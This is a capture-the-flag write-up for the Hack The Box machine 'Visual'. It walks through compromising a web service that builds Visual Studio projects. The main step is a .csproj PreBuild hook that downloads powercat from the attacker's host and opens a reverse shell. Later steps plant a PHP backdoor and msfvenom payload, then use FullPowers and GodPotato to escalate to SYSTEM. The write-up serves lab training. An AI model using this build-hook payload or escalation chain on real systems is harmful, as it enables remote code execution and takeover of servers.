# HTB - Visual
### TL;DR

### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 06:42 EDT
Stats: 0:04:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.129.131.71
Host is up, received user-set (0.20s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 495.11 seconds
```
Scan the open services.
```markdown
> nmap $target -p80 -sV -sC -Pn -v      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 06:53 EDT
Nmap scan report for 10.129.131.71
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Visual - Revolutionizing Visual Studio Builds

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
```
So there is an Apache 2.4.56 web server running on port 80. We inspect the site with firefox entering the url http://visual.htb, and we find a web app which compiles and stores visual studio projects. After supplying a git repo link, the app pulls the files, compiles the net 6.0 and c# projects and uploads them in the site.

![visual1](https://github.com/g1vi/Write-up/assets/120142960/d6013b76-77ba-4f2a-8f0d-8338c2dd5560)
<br>
<br>
### PHASE 2. User
Our goal is to prepare a local http git repo serving a visual studio solution. For this, we start making a directory called `repo` and create a new visual studio solution called `repo.sln`
```markdown
> mkdir repo
> cd repo
> dotnet new sln -n repo
The template "Solution File" was created successfully.
```
From the `repo` directory, create a new project (specifically, a console c# app) called `myapp`
```markdown
> dotnet new console -o myapp
The template "Console App" was created successfully.
Processing post-creation actions...
Running 'dotnet restore' on /home/kali/htb/repo/myapp/myapp.csproj...
  Determining projects to restore...
  Restored /home/kali/htb/repo/myapp/myapp.csproj (in 106 ms).
  Restore succeeded.
```
This will generate a new folder called `myapp` containing a project file called `myapp.csproj` and a c# source file called `Program.cs`. Finally, we add the c# project to the visual studio solution.
```markdown
> dotnet sln repo.sln add myapp/myapp.csproj
Project `myapp/myapp.csproj` added to the solution.
```
Once visual studio part is finished, we need to initialize a git repository in the `repo` directory and serve it via http. For this, firstly initialize the git repo on directory `repo`
```markdown
> cd repo
> git init
```
The directory `repo/.git` is created after this. The `.git` directory contains the repo files and metadata. Next step is to add all files on the `repo` directory to the git.
```markdown
> git add .
```
Check there no more untracked files in the git repo to be added.
```markdown
> git status
On branch master

No commits yet

Changes to be committed:
  (use "git rm --cached <file>..." to unstage)
        new file:   myapp/Program.cs
        new file:   myapp/myapp.csproj
        new file:   myapp/obj/myapp.csproj.nuget.dgspec.json
        new file:   myapp/obj/myapp.csproj.nuget.g.props
        new file:   myapp/obj/myapp.csproj.nuget.g.targets
        new file:   myapp/obj/project.assets.json
        new file:   myapp/obj/project.nuget.cache
        new file:   repo.sln
```
Commit changes.
```markdown
> git commit -m 'first commit'

 8 files changed, 254 insertions(+)
 create mode 100644 myapp/Program.cs
 create mode 100644 myapp/myapp.csproj
 create mode 100644 myapp/obj/myapp.csproj.nuget.dgspec.json
 create mode 100644 myapp/obj/myapp.csproj.nuget.g.props
 create mode 100644 myapp/obj/myapp.csproj.nuget.g.targets
 create mode 100644 myapp/obj/project.assets.json
 create mode 100644 myapp/obj/project.nuget.cache
 create mode 100644 repo.sln
```markdown
Finally, move to .git directory and update server info.
```markdown
> git update-server-info
```
Now the git is ready to be served on http. We can test it, move to `.git` and serve the repo with a python http server. Then, in the web app, enter the local machine ip. Shortly after, the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder and the app supplies the user with the resulting url.
```markdown
> cd .git                                                                                                                      
> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.129.131.71 - [02/Oct/2023 06:35:21] "GET /info/refs?service=git-upload-pack HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:21] "GET /HEAD HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/c1/149ed1d5d95b61620419e6edcd044c2e011dc3 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/9c/bbf0dddb9793273a5f11cb16638df6e5f75f79 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/6d/14b52ecedd9bdefeb99b8df164c512076e6706 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/33/4fb98c99505b620c51b1df5906d431b2c39b46 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/17/03899202f0c1e462462aee89e21b94d14dfcc5 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/40/c60dd4c884340c455eab8a0020f7c681a4e76c HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/05/0a823dc452240c816714aa0e67132cf2c02fc8 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/fc/4d85547b5061c57acf144aed69cdcf221184a7 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/d5/c27794d9d18d997cd9b5a997bcfccda6957ccb HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/3d/c06ef3cc4057524bf5d2cd49936dff789cebe8 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/49/ca051d7448fd4227ddd3d50b1fc3a7bb01a665 HTTP/1.1" 200 -
10.129.131.71 - [02/Oct/2023 06:35:22] "GET /objects/64/6073d646e06c42705eaab844dcf6117f0662a9 HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

![visual2](https://github.com/g1vi/Write-up/assets/120142960/30e914ad-fd62-4141-a0bb-3f3cb841d533)

Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple Program.cs source file and, in the `myapp.csproj` file, add the pre event.
```markdown
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.80:8080/powercat.ps1');powercat -c 10.10.14.59 -p 1919 -e cmd" />
  </Target>

</Project>
```
After this, add again all files to git, commit, update server info and restart the python http server (from .git directory).
```markdown
> cd repo
> git add .
> git commit -m 'commit'
> cd .git
> git update-server-info
> python3 -m http.server 80
```
Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919.
<br>
<br>
### PHASE 3. System
Enumerate the system.
```markdown
> systeminfo

Host Name:                 VISUAL
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
```
Enumerate current user privileges.
```markdown
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
After enumeration, we discover we have write access to webroot folder so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Let's check who is running the http service.
```markdown
> wmic service where started=true get name,startname

Name                    StartName                    
ApacheHTTPServer        NT AUTHORITY\Local Service   
BFE                     NT AUTHORITY\LocalService    
BrokerInfrastructure    LocalSystem                  
camsvc                  LocalSystem                  
CDPSvc                  NT AUTHORITY\LocalService
```
The user is `ApacheHTTPServer`, who is `nt authority\local service`. Copy a `simple-backdoor.php` and a `.exe` msfvenom payload into the webroot folder (download with certutil). Then start a listener and execute the `.exe` payload server side using a browser and the `simple-backdoor.php`. A reverse shell for user `nt authority\local service` is received on the listener.
Enumerate ApacheHTTPService user's permissions
```markdown
> whoami
nt authority\local service

> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, verify impersonation privilege is restored aftwerwards.
```markdown
> fp.exe
[+] Started dummy thread with id 2388
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
Once we have impersonation privilege restored, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
```markdown
> godpotato-net4.exe -cmd "cmd /c shell.exe"
[*] CombaseModule: 0x140716178145280
[*] DispatchTable: 0x140716180451440
[*] UseProtseqFunction: 0x140716179827616
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\31962564-9378-49a1-bceb-caf0e761bab8\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000802-1194-ffff-78e9-866782c9261c
[*] DCOM obj OXID: 0x1824f813e9024d03
[*] DCOM obj OID: 0x5c3d6b4cfc42b15a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 852 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2932
```
A system shell is received on listener.















